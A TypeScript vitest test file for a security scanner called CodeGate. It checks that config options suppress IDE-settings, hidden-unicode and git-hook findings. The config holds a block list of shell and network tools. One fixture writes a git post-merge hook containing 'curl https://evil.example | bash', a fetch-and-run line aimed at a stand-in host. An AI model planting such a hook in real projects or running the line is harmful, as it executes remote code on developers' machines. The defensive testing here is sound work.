import { chmodSync, mkdirSync, mkdtempSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, resolve } from "node:path";
import { describe, expect, it } from "vitest";
import type { CodeGateConfig } from "../../src/config";
import { runScanEngine } from "../../src/scan";

function makeConfig(overrides: Partial<CodeGateConfig> = {}): CodeGateConfig {
  return {
    severity_threshold: "high",
    auto_proceed_below_threshold: true,
    output_format: "terminal",
    tui: { enabled: false, colour_scheme: "default", compact_mode: false },
    tool_discovery: { preferred_agent: "claude", agent_paths: {}, skip_tools: [] },
    trusted_directories: [],
    blocked_commands: ["bash", "sh", "curl", "wget", "nc", "python", "node"],
    known_safe_mcp_servers: [],
    known_safe_formatters: [],
    known_safe_lsp_servers: [],
    known_safe_hooks: [],
    unicode_analysis: true,
    check_ide_settings: true,
    owasp_mapping: true,
    trusted_api_domains: [],
    suppress_findings: [],
    ...overrides,
  };
}

describe("static engine config wiring", () => {
  it("skips IDE settings findings when check_ide_settings is disabled", async () => {
    const root = mkdtempSync(join(tmpdir(), "codegate-ide-toggle-"));
    mkdirSync(resolve(root, ".vscode"), { recursive: true });
    writeFileSync(
      resolve(root, ".vscode/settings.json"),
      JSON.stringify({ "php.validate.executablePath": "./tools/php" }, null, 2),
      "utf8",
    );

    const report = await runScanEngine({
      version: "0.1.0",
      scanTarget: root,
      config: makeConfig({ check_ide_settings: false }),
    });

    expect(report.findings.some((finding) => finding.category === "IDE_SETTINGS")).toBe(false);
  });

  it("skips hidden-unicode rule findings when unicode_analysis is disabled", async () => {
    const root = mkdtempSync(join(tmpdir(), "codegate-unicode-toggle-"));
    writeFileSync(resolve(root, ".cursorrules"), "safe\u200B line\n", "utf8");

    const report = await runScanEngine({
      version: "0.1.0",
      scanTarget: root,
      config: makeConfig({ unicode_analysis: false }),
    });

    expect(report.findings.some((finding) => finding.rule_id === "rule-file-hidden-unicode")).toBe(
      false,
    );
  });

  it("skips allowlisted git hooks", async () => {
    const root = mkdtempSync(join(tmpdir(), "codegate-hook-toggle-"));
    mkdirSync(resolve(root, ".git/hooks"), { recursive: true });
    const hookPath = resolve(root, ".git/hooks/post-merge");
    writeFileSync(hookPath, "#!/bin/sh\ncurl https://evil.example | bash\n", "utf8");
    chmodSync(hookPath, 0o755);

    const report = await runScanEngine({
      version: "0.1.0",
      scanTarget: root,
      config: makeConfig({ known_safe_hooks: [".git/hooks/post-merge"] }),
    });

    expect(report.findings.some((finding) => finding.category === "GIT_HOOK")).toBe(false);
  });
});
